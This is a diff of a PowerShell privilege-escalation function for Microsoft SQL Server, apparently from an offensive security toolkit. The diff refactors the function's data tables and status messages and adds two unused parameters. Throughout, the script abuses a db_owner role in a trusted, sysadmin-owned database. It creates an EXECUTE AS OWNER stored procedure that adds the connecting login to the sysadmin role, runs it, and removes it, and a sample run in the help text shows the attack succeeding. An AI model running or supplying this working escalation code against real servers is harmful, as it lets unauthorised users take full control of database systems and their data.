@@ -12,11 +12,11 @@ function Invoke-SqlServerDbElevateDbOwner
 	.EXAMPLE
 	   Getting sysadmin as a user that has the db_owner role in a trusted database owned by a sysadmin.
 
-	   PS C:\> Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance VMNTSPI-297-SS\SQLEXPRESS
+	   PS C:\> Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
 	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
 	   [*] Connected.
 	   [*] Enumerating accessible trusted databases owned by sysadmins...
-	   [*] 2 accessible databases found.
+	   [*] 3 accessible databases found.
 	   [*] Checking if current user has db_owner role in any of them...
 	   [*] myappuser as db_owner role in 2 databases.
 	   [*] Attempting to evelate myappuser to sysadmin via master database...
@@ -42,6 +42,14 @@ function Invoke-SqlServerDbElevateDbOwner
     [Parameter(Mandatory=$false,
     HelpMessage='Set SQL Login password.')]
     [string]$SqlPass,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage='Set SQL Login username.')]
+    [string]$newuser,
+    
+    [Parameter(Mandatory=$false,
+    HelpMessage='Set SQL Login password.')]
+    [string]$newPass,
 
     [Parameter(Mandatory=$true,
     HelpMessage='Set target SQL Server instance.')]
@@ -87,16 +95,12 @@ function Invoke-SqlServerDbElevateDbOwner
     }
 
     # -----------------------------------------------
-    # Create data tables
+    # Create data tables for later
     # -----------------------------------------------
 
     # Create data table to house list of trusted databases owned by a sysadmin  
     $TableDatabases = New-Object System.Data.DataTable 
-
-    # Create data table to house db_owner databases
-    $TableSP = New-Object System.Data.DataTable 
-
-    # Create data table to success status
+    $TableDBOwner = New-Object System.Data.DataTable 
     $CheckforSysadmin = New-Object System.Data.DataTable 
 
     # -----------------------------------------------
@@ -123,19 +127,11 @@ function Invoke-SqlServerDbElevateDbOwner
     # Check if any accessible databases where found 
     if ($TableDatabases.rows.count -eq 0){
 
-	    write-host "No accessible databases found."
+	    write-host "No accessible databases found." -foreground "red"
         Break
     }else{
-	    $DbCount = $TableDatabases.rows.count
-        
-        # Set status color   
-        if ( $DbCount -ne 0){ 
-            $LineColor = 'green' 
-        }else{
-            $LineColor = 'red'
-        }
-        
-	    write-host "[*] $DbCount accessible databases found." -foreground $LineColor
+	    $DbCount = $TableDatabases.rows.count      
+	    write-host "[*] Found $DbCount trusted databases owned by a sysadmin." -foreground "green"
     }
 
     # -------------------------------------------------
@@ -143,8 +139,7 @@ function Invoke-SqlServerDbElevateDbOwner
     # -------------------------------------------------
     if ($TableDatabases.rows.count -ne 0){	
 
-        write-host "[*] Checking if current user has db_owner role in any of them..."
-        $x = 0
+        write-host "[*] Checking if $ConnectUser the has db_owner role in any of them..."
 	    $TableDatabases | foreach {
 
 		    [string]$CurrentDatabase = $_.databasename                    
@@ -159,68 +154,40 @@ function Invoke-SqlServerDbElevateDbOwner
 		    # Query the databases and load the results into the TableDatabase data table object
 		    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryProcedures,$conn)
 		    $results2 = $cmd.ExecuteReader()
-		    $TableSP.Load($results2)  
+		    $TableDBOwner.Load($results2)  
        		
 	    }
     }
 
-    # Get number database wwhere the user is db_owner
-    $SpCount = $TableSP.rows.count 
-    
-    # Set status color   
-    if ( $SpCount -ne 0){ 
-            $LineColor = 'green' 
-    }else{
-            $LineColor = 'red'
-    }
-    write-host "[*] $ConnectUser as db_owner role in $SpCount databases." -foreground $LineColor
+    # -------------------------------------------------
+    # Attempt to escalate privileges
+    # -------------------------------------------------
 
-    if ($SpCount -ne 0) {
+    # Get number database wwhere the user is db_owner
+    $DbOwnerRoleCount = $TableDBOwner.rows.count 
+
+    if ($DbOwnerRoleCount -ne 0) {      
         
         # Set db to be used for escalating privs # fix this
-        $TableSP | Select-Object db -first 1 | foreach {
+        $TableDBOwner | Select-Object db -first 1 | foreach {
             $ElevateOnDb = $_.db            
         }
 
         # Status user
-        write-host "[*] Attempting to evelate $ConnectUser to sysadmin via $ElevateOnDb database..."
+        write-host "[*] $ConnectUser has db_owner role in $DbOwnerRoleCount of the databases." -foreground "green"
+        write-host "[*] Attempting add $ConnectUser to the sysadmin role via the $ElevateOnDb database..."      
 
-        # Create sp
-        $QueryElevate1 = "CREATE PROCEDURE sp_elevate_me
-        WITH EXECUTE AS OWNER
-        AS
-        begin
-        EXEC sp_addsrvrolemember '$ConnectUser','sysadmin'
-        end"
-
-         # Execute sp
-        $QueryElevate2 = "EXEC sp_elevate_me"
-
-        # remove sp
-        $QueryElevate3 = "drop proc sp_elevate_me"
-
-        # verify sysadmin
-        $QueryElevate4 = "select is_srvrolemember('sysadmin')"
-
-        # Attempt killing the database connection
-        try{
-            $conn.Close()            
-        }catch{
-            $ErrorMessage = $_.Exception.Message
-            write-host "[*] Connection failed" -foreground "red"
-            write-host "[*] Error: $ErrorMessage" -foreground "red"  
-            Break
-        }
-
-         # Set authentication type and create connection string    
+        # Set authentication type and create connection string for the targeted database 
         if($SqlUser -and $SqlPass){   
            
             # SQL login
+            $conn.Close()
             $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;User ID=$SqlUser;Password=$SqlPass;"
             [string]$ConnectUser = $SqlUser
         }else{
           
             # Trusted connection
+            $conn.Close()
             $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;Integrated Security=SSPI;"
             $UserDomain = [Environment]::UserDomainName
             $Username =  [Environment]::UserName
@@ -228,38 +195,49 @@ function Invoke-SqlServerDbElevateDbOwner
        
         }
 
-		# create stored procedure
+		# Create stored procedures to escalate privileges
         $conn.Open()
-		$cmd3 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate1,$conn)
-		$results3 = $cmd3.ExecuteReader() 
+        $QueryElevate = "CREATE PROCEDURE sp_elevate_me
+        WITH EXECUTE AS OWNER
+        AS
+        begin
+        EXEC sp_addsrvrolemember '$ConnectUser','sysadmin'
+        end"
+		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+		$results = $cmd.ExecuteReader() 
         $conn.Close()         
 
-		# execute stored procedures
+		# Execute stored procedures to escalate privileges
         $conn.Open()
-		$cmd4 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate2,$conn)
-		$results4 = $cmd4.ExecuteReader() 
+        $QueryElevate = "EXEC sp_elevate_me"
+		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+		$results = $cmd.ExecuteReader() 
         $conn.Close() 
 
-		# remove stored procedure
+		# Remove stored procedure
         $conn.Open()
-		$cmd5 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate3,$conn)
-		$results5 = $cmd5.ExecuteReader() 
+        $QueryElevate = "drop proc sp_elevate_me"
+		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+		$results = $cmd.ExecuteReader() 
         $conn.Close() 
 
-		# verify escalation
+		# Verify that privilege escalation works
         $conn.Open()
-		$cmd6 = New-Object System.Data.SqlClient.SqlCommand($QueryElevate4,$conn)
-		$results6 = $cmd6.ExecuteReader() 
-        $CheckforSysadmin.Load($results6) 
+        $QueryElevate = "select is_srvrolemember('sysadmin')"
+		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+		$results = $cmd.ExecuteReader() 
+        $CheckforSysadmin.Load($results) 
         $conn.Close() 
         
         if ($CheckforSysadmin -ne 0){
             write-host "[*] Success! - $ConnectUser is now a sysadmin." -foreground "green" 
             
         }else{
-            write-host "[*] Sorry something failed." -foreground "red" 
+            write-host "[*] Sorry, something failed, no sysadmin for you." -foreground "red" 
         }
            
+    }else{
+         write-host "[*] Sorry, $ConnectUser doesn't have the db_owner role in any of the sysadmin databases." -foreground "red" 
     }
     
 	write-host "[*] All done." 
